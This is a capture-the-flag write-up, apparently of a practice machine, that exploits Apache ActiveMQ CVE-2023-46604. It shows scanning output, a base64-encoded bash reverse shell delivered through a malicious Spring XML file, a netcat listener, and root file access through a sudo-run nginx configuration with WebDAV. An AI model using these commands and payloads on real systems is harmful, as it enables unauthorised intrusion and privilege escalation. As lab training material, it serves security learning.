## Nmap Scan

I do a `nmap scan`:
```sh
┌──(kali㉿kali)-[~]
└─$ nmap -sV -sC -A 10.10.11.243     
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-18 13:28 EST
Nmap scan report for 10.10.11.243
Host is up (0.12s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-title: Error 401 Unauthorized
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.54 seconds
```

I see a strange service (`ActiveMQRealm`) I search a port standard to this service and then I try to see if this port is open

I search `port of ActiveMQ` and I  find the `Port 61616`, I do another nmap scan:
```sh
┌──(kali㉿kali)-[~]
└─$ nmap -sV -sC -A -p61616  10.10.11.243
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-18 13:35 EST
Nmap scan report for 10.10.11.243
Host is up (0.12s latency).

PORT      STATE SERVICE  VERSION
61616/tcp open  apachemq ActiveMQ OpenWire transport
| fingerprint-strings: 
|   NULL: 
|     ActiveMQ
|     TcpNoDelayEnabled
|     SizePrefixDisabled
|     CacheSize
|     ProviderName 
|     ActiveMQ
|     StackTraceEnabled
|     PlatformDetails 
|     Java
|     CacheEnabled
|     TightEncodingEnabled
|     MaxFrameSize
|     MaxInactivityDuration
|     MaxInactivityDurationInitalDelay
|     ProviderVersion 
|_    5.15.15
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port61616-TCP:V=7.94%I=7%D=11/18%Time=65590409%P=x86_64-pc-linux-gnu%r(
SF:NULL,140,"\0\0\x01<\x01ActiveMQ\0\0\0\x0c\x01\0\0\x01\*\0\0\0\x0c\0\x11
SF:TcpNoDelayEnabled\x01\x01\0\x12SizePrefixDisabled\x01\0\0\tCacheSize\x0
SF:5\0\0\x04\0\0\x0cProviderName\t\0\x08ActiveMQ\0\x11StackTraceEnabled\x0
SF:1\x01\0\x0fPlatformDetails\t\0\x04Java\0\x0cCacheEnabled\x01\x01\0\x14T
SF:ightEncodingEnabled\x01\x01\0\x0cMaxFrameSize\x06\0\0\0\0\x06@\0\0\0\x1
SF:5MaxInactivityDuration\x06\0\0\0\0\0\0u0\0\x20MaxInactivityDurationInit
SF:alDelay\x06\0\0\0\0\0\0'\x10\0\x0fProviderVersion\t\0\x075\.15\.15");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.42 seconds
```

The version to this service is the `5.15.15`
For this version I find this exploit https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ , now I download this exploit:
```sh
┌──(kali㉿kali)-[~/Broker]
└─$ git clone https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ
Cloning into 'CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ'...
remote: Enumerating objects: 20, done.
remote: Counting objects: 100% (20/20), done.
remote: Compressing objects: 100% (15/15), done.
remote: Total 20 (delta 7), reused 9 (delta 3), pack-reused 0
Receiving objects: 100% (20/20), 1.64 MiB | 7.31 MiB/s, done.
Resolving deltas: 100% (7/7), done.

┌──(kali㉿kali)-[~/Broker]
└─$ ls
CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ

┌──(kali㉿kali)-[~/Broker]
└─$ cd CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ

┌──(kali㉿kali)-[~/Broker/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ]
└─$ go build -ldflags '-s -w' .
go build: when using gccgo toolchain, please pass linker flags using -gccgoflags, not -ldflags

┌──(kali㉿kali)-[~/Broker/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ]
└─$ upx ActiveMQ-RCE
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2020
UPX 3.96        Markus Oberhumer, Laszlo Molnar & John Reiser   Jan 23rd 2020

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
     78208 ->     31340   40.07%   linux/amd64   ActiveMQ-RCE                  

Packed 1 file.

┌──(kali㉿kali)-[~/Broker/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ]
└─$ pwd                        
/home/kali/Broker/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ
```

I open a Web Server in a new terminal session:
```sh
┌──(kali㉿kali)-[~]
└─$ cd ~/Broker/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ

┌──(kali㉿kali)-[~/Broker/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ]
└─$ python3 -m http.server 8001                                 
Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...
```

I convert this to base64 to send the connection:
```sh
┌──(kali㉿kali)-[~/Broker/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ]
└─$ echo -n "bash -c 'bash -i >& /dev/tcp/10.10.14.125/8443 0>&1'" | base64 -w 0
YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMjUvODQ0MyAwPiYxJw==                             
```

I edit the `poc-linux.xml` in this way:
```sh
┌──(kali㉿kali)-[~/Broker/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ]
└─$ cat poc-linux.xml
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="
 http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
        <list>
            <value>sh</value>
            <value>-c</value>
            <!-- The command below downloads the file and saves it as test.elf -->
            <value>echo -n YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMjUvODQ0MyAwPiYxJw== | base64 -d | bash</value>
        </list>
        </constructor-arg>
    </bean>
</beans>
```

I open a Listening Port:
```sh
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 8443 
listening on [any] 8443 ...
```

I run the exploit:
```sh
┌──(kali㉿kali)-[~/Broker/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ]
└─$ ./ActiveMQ-RCE -i 10.10.11.243 -u http://10.10.14.125:8001/poc-linux.xml
     _        _   _           __  __  ___        ____   ____ _____ 
    / \   ___| |_(_)_   _____|  \/  |/ _ \      |  _ \ / ___| ____|
   / _ \ / __| __| \ \ / / _ \ |\/| | | | |_____| |_) | |   |  _|  
  / ___ \ (__| |_| |\ V /  __/ |  | | |_| |_____|  _ <| |___| |___ 
 /_/   \_\___|\__|_| \_/ \___|_|  |_|\__\_\     |_| \_\\____|_____|

[*] Target: 10.10.11.243:61616
[*] XML URL: http://10.10.14.125:8001/poc-linux.xml

[*] Sending packet: 000000791f000000000000000000010100426f72672e737072696e676672616d65776f726b2e636f6e746578742e737570706f72742e436c61737350617468586d6c4170706c69636174696f6e436f6e74657874010026687474703a2f2f31302e31302e31342e3132353a383030312f706f632d6c696e75782e786d6c
```

I Spawn the Reverse Shell:
```sh
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 8443
listening on [any] 8443 ...
connect to [10.10.14.125] from (UNKNOWN) [10.10.11.243] 48050
bash: cannot set terminal process group (883): Inappropriate ioctl for device
bash: no job control in this shell
activemq@broker:/opt/apache-activemq-5.15.15/bin$ whoami
whoami
activemq
activemq@broker:/opt/apache-activemq-5.15.15/bin$ 
```

I read the `user flag`
```
activemq@broker:/opt/apache-activemq-5.15.15/bin$ cat /home/activemq/user.txt          
cat /home/activemq/user.txt
042ebb1a779f87500482bb0e7122958f
```

## Privilege Escalation

I see all the `sudo privileges`:
```sh
activemq@broker:/opt/apache-activemq-5.15.15/bin$ sudo -l
sudo -l
Matching Defaults entries for activemq on broker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
activemq@broker:/opt/apache-activemq-5.15.15/bin$ 
```

Ok,the privesc it's very easy because I can open a Web Server like root and via http I can read the root flag

I create a custom configuration. I will create the file `privesc.conf` in the `/tmp` directory with the following content:
```sh
user root;  
worker_processes auto;  
pid /run/nginx2.pid;  
include /etc/nginx/modules-enabled/*.conf;  
events {  
worker_connections 1024;  
}  
http {  
server {  
listen 7777;  
location / {  
root /;  
autoindex on;  
dav_methods PUT;  
}  
}  
}
```

I add my custom configuration:
```sh
activemq@broker:/tmp$ sudo /usr/sbin/nginx -c /tmp/privesc.conf
sudo /usr/sbin/nginx -c /tmp/privesc.conf
```

Now I do a HTTP Request to have the `root flag`:
```
┌──(kali㉿kali)-[~/Broker/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ]
└─$ curl http://10.10.11.243:7777/root/root.txt                 
04c7082fe17721d78e511c13f08d66f7
```